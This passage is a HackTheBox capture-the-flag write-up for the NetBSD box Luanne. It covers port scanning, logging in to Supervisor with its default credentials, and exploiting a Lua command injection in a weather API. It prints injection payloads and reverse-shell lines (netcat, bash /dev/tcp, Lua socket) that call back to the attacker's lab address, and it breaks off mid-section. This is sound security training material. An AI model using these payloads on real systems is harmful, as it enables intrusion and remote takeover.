@@ -1,0 +1,656 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Luanne</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-luanne">htb-luanne</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#netbsd">netbsd</a> <a class="post-tag" href="/tags#supervisor-process-manager">supervisor-process-manager</a> <a class="post-tag" href="/tags#default-creds">default-creds</a> <a class="post-tag" href="/tags#http-basic-auth">http-basic-auth</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#api">api</a> <a class="post-tag" href="/tags#lua">lua</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#htpasswd">htpasswd</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#doas">doas</a> <a class="post-tag" href="/tags#pgp">pgp</a> <a class="post-tag" href="/tags#netpgp">netpgp</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#oscp-like-v2">oscp-like-v2</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-03-27T13:45:00+00:00" itemprop="datePublished">Mar 27, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/03/27/htb-luanne.html" style="color: #e6e6e6; text-decoration: none;">HTB: Luanne</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/luanne-cover.webp" type="image/webp"/>
+<img alt="Luanne" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/luanne-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Luanne was the first NetBSD box I’ve done on HTB. I’ll gain access to an instance of Supervisor Process Manager, and use that to leak a process list, which shows where to look on the port 80 webserver. I’ll find an API that I know is backed by a Lua script, and exploit a command injection vulnerability to get execution and a shell. I’ll get credentials for a webserver listening on localhost and find an SSH key hosted there to get to the second user. That user can doas (like sudo on BSD) arbitrary commands as root, the password is needed. It’s in an encrypted backup file which can be decrypted using PGP on the host. In Beyond Root, I’ll look at the Lua script, figure out how it works, where the injection vulnerability is, and compare that to the patched dev version to see how it was fixed.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/302 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/luanne" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Luanne</a> <a href="https://hackthebox.com/machines/luanne" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-luanne.webp" type="image/webp"/> <img alt="Luanne" class="img-av" src="/icons/box-luanne.png"/></picture></a><br/><a href="https://hackthebox.com/machines/luanne" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1375037379313086469">28 Nov 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">27 Mar 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">NetBSD</td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/luanne-diff.webp" type="image/webp"/><img alt="Rated difficulty for Luanne" src="/img/luanne-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/luanne-radar.webp" type="image/webp"/><img alt="Radar chart for Luanne" src="/img/luanne-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:34:11</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:50:24</span><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/159204" rel="noopener" target="_blank"><img alt="polarbearer" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/159204" style="display: unset"/><span class="user-text" style="display: none"> polarbearer</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found three open TCP ports, SSH (22), HTTP (80), and Medisa httpd / Supervisor process manager (9001):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.218
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:33 EDT
+Warning: 10.10.10.218 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.218
+Host is up (0.023s latency).
+Not shown: 58365 filtered ports, 7167 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9001/tcp open  tor-orport
+
+Nmap done: 1 IP address (1 host up) scanned in 71.24 seconds
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,9001 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.218
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:35 EDT
+Nmap scan report for 10.10.10.218
+Host is up (0.026s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+80/tcp   open  http    nginx 1.19.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+| http-robots.txt: 1 disallowed entry 
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-server-header: Medusa/1.12
+|_http-title: Error response
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 186.73 seconds
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> identifies the box as running NetBSD, another BSD variant.</p>
+<p>TCP 80 has a <code class="language-plaintext highlighter-rouge">robots.txt</code> file with <code class="language-plaintext highlighter-rouge">/weather</code> disallowed.</p>
+<h3 id="supervisor-process-manager---tcp-9001">Supervisor Process Manager - TCP 9001</h3>
+<h4 id="auth">Auth</h4>
+<p>Visiting the page returns a 401 and a prompt for auth:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210325120130827.webp" type="image/webp"/>
+<img alt="image-20210325120130827" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210325120130827.png"/>
+</picture>
+<p>There’s a hint there, “default”.</p>
+<p>Googling for “supervisord default password” returns a top hit to the docs for the project on the <a href="http://supervisord.org/configuration.html">configuration file</a>. There isn’t a default password, but there is an example config file:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210325120522654.webp" type="image/webp"/>
+<img alt="image-20210325120522654" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210325120522654.png"/>
+</picture>
+<p>Sure enough, entering user / 123 lets me into the site:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210325120551942.webp" type="image/webp"/>
+<img alt="image-20210325120551942" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210325120551942.png"/>
+</picture>
+<h4 id="process-list">Process List</h4>
+<p>The dashboard shows three running scripts, and clicking on the name of any of them leads to the output. I didn’t get anything interesting from <code class="language-plaintext highlighter-rouge">memory</code> or <code class="language-plaintext highlighter-rouge">uptime</code>. <code class="language-plaintext highlighter-rouge">process</code> returns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/python3.8 /usr/pkg/bin/supervisord-3.8 
+root        348  0.0  0.0  74136  2928 ?     Is    3:33PM 0:00.01 /usr/sbin/sshd 
+_httpd      376  0.0  0.0  35244  2008 ?     Is    3:33PM 0:00.01 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
+root        402  0.0  0.0  20216  1664 ?     Is    3:33PM 0:00.01 /usr/sbin/cron 
+_httpd     1997  0.0  0.0  14564   484 ?     O     4:10PM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
+root        421  0.0  0.0  19784  1580 ttyE1 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE1 
+root        388  0.0  0.0  19784  1584 ttyE2 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE2 
+root        426  0.0  0.0  19780  1580 ttyE3 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE3 
+</code></pre></div></div>
+<p>There’s a long <code class="language-plaintext highlighter-rouge">grep</code> which is likely selecting which lines of the full process list are displayed here. The only command line string that really gives much information is the one for <code class="language-plaintext highlighter-rouge">httpd</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
+</code></pre></div></div>
+<p>Using the <a href="https://www.daemon-systems.org/man/httpd.8.html">man page for httpd on NetBSD (or bozohttpd)</a>, the args are:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-u</code>: Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html</li>
+<li><code class="language-plaintext highlighter-rouge">-X</code>: Enables directory indexing</li>
+<li><code class="language-plaintext highlighter-rouge">-s</code>: Force logging to stderr</li>
+<li><code class="language-plaintext highlighter-rouge">-i 127.0.0.1</code>: listen on localhost</li>
+<li><code class="language-plaintext highlighter-rouge">-I 3000</code>: listen on port 3000</li>
+<li><code class="language-plaintext highlighter-rouge">-L weather weather.lua</code>: Adds a Lua script for the prefix <code class="language-plaintext highlighter-rouge">weather</code>. So Visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/[something]</code> will be handled by this Lua script.</li>
+<li><code class="language-plaintext highlighter-rouge">-U _http</code>: Run as _http user</li>
+<li><code class="language-plaintext highlighter-rouge">-b</code>: Enable daemon mode</li>
+<li><code class="language-plaintext highlighter-rouge">/var/www</code>: Root directory to serve from</li>
+</ul>
+<p>It’s interesting that the Lua script is handling the path disallowed in the <code class="language-plaintext highlighter-rouge">robots.txt</code> file.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Trying to visit the site pops an auth prompt:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210325113747662.webp" type="image/webp"/>
+<img alt="image-20210325113747662" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210325113747662.png"/>
+</picture>
+<h4 id="http-401">HTTP 401</h4>
+<p>It’s not part of the box, but it is interesting to know what is really happening here. Looking in Burp, I’ll see this is really a GET request from my browser for <code class="language-plaintext highlighter-rouge">/</code>, with a 401 response from the server. Firefox sees that 401 and prompts for creds. If I add some and submit, it will send the same GET request again, this time with an extra header:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Basic MHhkZjoweGRm
+</code></pre></div></div>
+<p>The base64 string is just the encoded creds I entered:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"MHhkZjoweGRm"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">0xdf:0xdf
+</span></code></pre></div></div>
+<h4 id="response">Response</h4>
+<p>More interestingly, there’s some information in the response:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">Unauthorized</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.19.0</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 25 Mar 2021 15:40:47 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">209</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">WWW-Authenticate</span><span class="p">:</span> <span class="s">Basic realm="."</span>
+
+<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>401 Unauthorized<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>401 Unauthorized<span class="nt">&lt;/h1&gt;</span>
+/index.html: <span class="nt">&lt;pre&gt;</span>No authorization<span class="nt">&lt;/pre&gt;</span>
+<span class="nt">&lt;hr&gt;&lt;address&gt;&lt;a</span> <span class="na">href=</span><span class="s">"//127.0.0.1:3000/"</span><span class="nt">&gt;</span>127.0.0.1:3000<span class="nt">&lt;/a&gt;&lt;/address&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>As <code class="language-plaintext highlighter-rouge">nmap</code> identified, the server is nginx.</p>
+<p>The <code class="language-plaintext highlighter-rouge">WWW-Authenticate: Basic realm="."</code> header is saying that the type of auth required is HTTP basic, the description of the auth is just <code class="language-plaintext highlighter-rouge">.</code>, which doesn’t tell me much.</p>
+<p>There’s also a reference to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> as the source of this response. That suggests that NGINX is proxying the requests on 80 to <code class="language-plaintext highlighter-rouge">httpd</code> to handle them on localhost port 3000, as noted above in the process list.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> (<a href="https://github.com/epi052/feroxbuster">GitHub</a>) against the site, but it doesn’t find anything:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.218 <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
+<span class="go">                                                                              
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__ 
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                            
+by Ben "epi" Risher 🤓                 ver: 2.2.1
+───────────────────────────┬──────────────────────                        
+ 🎯  Target Url            │ http://10.10.10.218
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.2.1                 
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest 
+───────────────────────────┴──────────────────────                       
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────                            
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 15s    29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:0       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 14s    29999/29999   2005/s  http://10.10.10.218  
+</span></code></pre></div></div>
+<p>I’m trying the default wordlist for <code class="language-plaintext highlighter-rouge">feroxbuster</code> from <a href="https://github.com/danielmiessler/SecLists">SecLists</a>, but I also tried my old standby <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium</code> and found nothing as well.</p>
+<h4 id="using-information-from-supervisord">Using Information from Supervisord</h4>
+<p>There is a custom Lua script running on requests to <code class="language-plaintext highlighter-rouge">/weather/</code>. Just visiting that path returns a 404. But running <code class="language-plaintext highlighter-rouge">feroxbuster</code> again finds something:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.218/weather <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
+<span class="go"> 
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.2.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.218/weather
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.2.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-green">200</span><span class="go">        1l       12w        0c http://10.10.10.218/weather/forecast
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 15s    29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:1       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 15s    29999/29999   1976/s  http://10.10.10.218/weather
+</span></code></pre></div></div>
+<h3 id="weather-api">Weather API</h3>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast</code> returns a raw JSON payload with a <code class="language-plaintext highlighter-rouge">message</code> that a city is required, and a hint on how to list them:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210325122325849.webp" type="image/webp"/>
+<img alt="image-20210325122325849" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210325122325849.png"/>
+</picture>
+<p>I can switch to <code class="language-plaintext highlighter-rouge">curl</code> and <code class="language-plaintext highlighter-rouge">jq</code> at this point:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://10.10.10.218/weather/forecast | jq <span class="nb">.</span>
+<span class="go">{
+  "code": 200,
+  "message": "No city specified. Use 'city=list' to list available cities."
+}
+</span></code></pre></div></div>
+<p>I typically use <code class="language-plaintext highlighter-rouge">-s</code> on curl by habit so when I start piping it to things, I don’t see the status message.</p>
+<p>Adding <code class="language-plaintext highlighter-rouge">?city=list</code> to the end of the url provides a list of cities in the UK:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://10.10.10.218/weather/forecast?city<span class="o">=</span>list | jq <span class="nb">.</span>
+<span class="go">{
+  "code": 200,
+  "cities": [
+    "London",
+    "Manchester",
+    "Birmingham",
+    "Leeds",
+    "Glasgow",
+    "Southampton",
+    "Liverpool",
+    "Newcastle",
+    "Nottingham",
+    "Sheffield",
+    "Bristol",
+    "Belfast",
+    "Leicester"
+  ]
+}
+</span></code></pre></div></div>
+<p>Picking a city from the list, it returns a bunch of (inaccurate) information about the weather there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://10.10.10.218/weather/forecast?city<span class="o">=</span>Leicester
+<span class="go">{"code": 200,"city": "Leicester","list": [{"date": "2021-03-25","weather": {"description": "snowy","temperature": {"min": "12","max": "46"},"pressure": "1799","humidity": "92","wind": {"speed": "2.1975513692014","degree": "102.76822959445"}}},{"date": "2021-03-26","weather": {"description": "partially cloudy","temperature": {"min": "15","max": "43"},"pressure": "1365","humidity": "51","wind": {"speed": "4.9522297247313","degree": "262.63571172766"}}},{"date": "2021-03-27","weather": {"description": "sunny","temperature": {"min": "19","max": "30"},"pressure": "1243","humidity": "13","wind": {"speed": "1.8041767538525","degree": "48.400944394059"}}},{"date": "2021-03-28","weather": {"description": "sunny","temperature": {"min": "30","max": "34"},"pressure": "1513","humidity": "84","wind": {"speed": "2.6126398323104","degree": "191.63755226741"}}},{"date": "2021-03-29","weather": {"description": "partially cloudy","temperature": {"min": "30","max": "36"},"pressure": "1772","humidity": "53","wind": {"speed": "2.7699138359167","degree": "104.89152945159"}}}]}
+</span></code></pre></div></div>
+<p>The city names are case-sensitive, and any input that isn’t an exact match leads to a 500 error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://10.10.10.218/weather/forecast?city<span class="o">=</span>washington
+<span class="go">{"code": 500,"error": "unknown city: washington"}
+</span></code></pre></div></div>
+<h2 id="shell-as-_http">Shell as _http</h2>
+<h3 id="identify-injection">Identify Injection</h3>
+<p>The requests at <code class="language-plaintext highlighter-rouge">/weather/forecast</code> are being passed to a Lua script, and the results come back as JSON which, in the case of anything not in the cities list, includes the submitted input. Googling for “Lua Injection”, the first link returned was titled <a href="https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities">Lua Web Application Secutiyy Vulnerabilities</a>. This article shows many different kinds of attacks, most of which are more complicated than I’ll need here. But what I found most useful were the examples of vulnerable scripts. The output sent back is typically written out with something like <code class="language-plaintext highlighter-rouge">r:puts(output)</code> or <code class="language-plaintext highlighter-rouge">ngx.say(output)</code> or <code class="language-plaintext highlighter-rouge">cgilua.put(output)</code>. If there’s no escaping done, perhaps I can inject commands.</p>
+<p>Sending just a double quote returns the error message as if the city was <code class="language-plaintext highlighter-rouge">"</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.218/weather/forecast?city="'</span>
+<span class="go">{"code": 500,"error": "unknown city: ""}
+</span></code></pre></div></div>
+<p>However, sending just a single quote crashes the script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.218/weather/forecast?city='"</span>
+<span class="go">&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+</span></code></pre></div></div>
+<p>If I add a closing parens and then a comment, it will actually send back the payload cut off in the middle:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.218/weather/forecast?city=')+--"</span>
+<span class="go">{"code": 500,"error": "unknown city:
+</span></code></pre></div></div>
+<p>This suggests that the string is being built in that command, and the comment took out the part that handles the closing <code class="language-plaintext highlighter-rouge">"</code> and <code class="language-plaintext highlighter-rouge">}</code>.</p>
+<h3 id="injection-poc">Injection POC</h3>
+<p>To run a command from Lua, <a href="https://gtfobins.github.io/gtfobins/lua/#sudo">GTFObins</a> shows it’s just <code class="language-plaintext highlighter-rouge">os.execute("[command]")</code>. Adding that works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"</span>
+<span class="go">{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd
+</span></code></pre></div></div>
+<p>To do a more complex payload, I’ll switch to letting <code class="language-plaintext highlighter-rouge">curl</code> encode my arg for me:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=') os.execute('id') --"</span> <span class="s1">'http://10.10.10.218/weather/forecast'</span> <span class="nt">-s</span> 
+<span class="go">{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-G</code> will force a GET commands, and use the data from <code class="language-plaintext highlighter-rouge">--data-urlencode</code> in the url instead of in the body.</p>
+<h3 id="shell">Shell</h3>
+<p>Because the box is BSD, some typical Linux reverse shells won’t work. I’ll start small. Can <code class="language-plaintext highlighter-rouge">nc</code> connect back to me?</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=') os.execute('nc 10.10.14.11 443') --"</span> <span class="s1">'http://10.10.10.218/weather/forecast'</span> <span class="nt">-s</span>
+</code></pre></div></div>
+<p>At my listener there’s a connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.218] 654
+</span></code></pre></div></div>
+<p>This isn’t a shell, but I know that the box has netcat and can connect to me. I could try <code class="language-plaintext highlighter-rouge">-e /bin/bash</code>, but it doesn’t work. Running <code class="language-plaintext highlighter-rouge">nc -h 2&gt;&amp;1</code> shows the <code class="language-plaintext highlighter-rouge">-e</code> option isn’t there. My goto Bash shell actually does give a connection back, but then immediately dies:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=') os.execute('bash -c "</span>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.11/443 0&amp;&gt;1<span class="s2">"') 'http://10.10.10.218/weather/forecast' -s
+</span></code></pre></div></div>
+<p>I tried a Lua shell, but the modules needed weren’t there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=') require('socket');require('os');t=socket.tcp();t:connect('10.10.14.11','443');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3') --"</span> <span class="s1">'http://10.10.10.218/weather/forecast'</span> <span class="nt">-s</span>
+<span class="go">{"code": 500,"error": "unknown city: &lt;br&gt;Lua error: [string "                httpd.write('{"code": 500,')..."]:2: module 'socket' not found:
+        no field package.preload['socket']
+        no file '/usr/share/lua/5.3/socket.lua'
+        no file '/usr/share/lua/5.3/socket/init.lua'
+        no file '/usr/lib/lua/5.3/socket.lua'
+        no file '/usr/lib/lua/5.3/socket/init.lua'
+        no file '/usr/lib/lua/5.3/socket.so'
+        no file '/usr/lib/lua/5.3/loadall.so'
+</span></code></pre></div></div>
+<p>The FIFO shell did work:</p>
